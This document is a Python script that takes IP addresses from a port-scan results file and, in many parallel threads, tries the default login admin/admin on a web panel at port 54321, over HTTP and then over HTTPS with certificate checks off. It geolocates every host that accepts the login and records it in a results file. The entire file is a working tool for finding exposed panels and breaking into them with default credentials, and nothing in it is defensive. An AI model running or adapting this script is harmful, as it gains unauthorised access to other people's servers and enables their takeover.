import requests
from concurrent.futures import ThreadPoolExecutor

data = {
    'username': 'admin',
    'password': 'admin'
}

def get_ip_info(ip):
    url = f"http://ip-api.com/json/{ip}?fields=country,regionName,city,isp"
    try:
        response = requests.get(url, timeout=2)
        if response.status_code == 200:
            ip_info = response.json()
            country = ip_info.get('country', 'N/A')
            region = ip_info.get('regionName', 'N/A')
            city = ip_info.get('city', 'N/A')
            isp = ip_info.get('isp', 'N/A')
            return f"{country}, {region}, {city}, ISP: {isp}"
    except requests.exceptions.RequestException:
        pass
    return 'N/A'

def process_ip(ip):
    url = "http://" + ip + ":54321/login"
    try:
        r = requests.post(url, data=data, timeout=2)
        if r.status_code == 200:
            try:
                response_data = r.json()
                if isinstance(response_data, dict) and response_data.get("success"):
                    ip_info = get_ip_info(ip)
                    print(ip + ' Successful (' + ip_info + ')')
                    with open("result.txt", "a") as result:
                        result.write(ip + ' (' + ip_info + ')\n')
                else:
                    print(ip + ' Def')
            except ValueError:
                print("Invalid JSON response from:", url)
        else:
            print(ip + ' Def')
    except requests.exceptions.RequestException:
        try:
            url = "https://" + ip + ":54321/login"
            r = requests.post(url, data=data, timeout=2, verify=False)
            if r.status_code == 200:
                try:
                    response_data = r.json()
                    if isinstance(response_data, dict) and response_data.get("success"):
                        ip_info = get_ip_info(ip)
                        print(ip + ' Successful (' + ip_info + ')')
                        with open("result.txt", "a") as result:
                            result.write(ip + ' (' + ip_info + ')\n')
                    else:
                        print(ip + ' Def')
                except ValueError:
                    print("Invalid JSON response from:", url)
            else:
                print(ip + ' Def')
        except requests.exceptions.RequestException:
            print(ip + ' Def')

if __name__ == "__main__":
    with open("results.txt", "r") as file:
        ips = [line.split("Host: ")[1].split(" ")[0] for line in file if len(line.split("Host: ")) >= 2]

    with ThreadPoolExecutor() as executor:
        executor.map(process_ip, ips)
